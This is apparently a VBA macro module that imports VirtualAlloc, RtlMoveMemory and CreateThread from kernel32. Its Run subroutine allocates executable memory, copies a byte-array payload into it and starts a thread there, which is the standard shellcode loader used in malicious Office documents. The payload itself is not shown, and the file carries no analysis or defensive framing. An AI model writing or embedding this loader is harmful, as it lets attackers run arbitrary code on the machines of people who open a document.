Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Const MEM_RESERVE = &H2000
Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Private Sub Run(ByRef bPayloadArr() As Byte)
    Dim lPayloadAddr As LongPtr, lPayloadSize As Long
    lPayloadAddr = VarPtr(bPayloadArr(0))
    lPayloadSize = UBound(bPayloadArr) - LBound(bPayloadArr) + 1
    
    Dim lpMemPtr As LongPtr, lResult As Long
    lpMemPtr = VirtualAlloc(0&, lPayloadSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    RtlMoveMemory lpMemPtr, lPayloadAddr, lPayloadSize
    lResult = CreateThread(0&, 0&, lpMemPtr, 0&, 0&, 0&)
End Sub
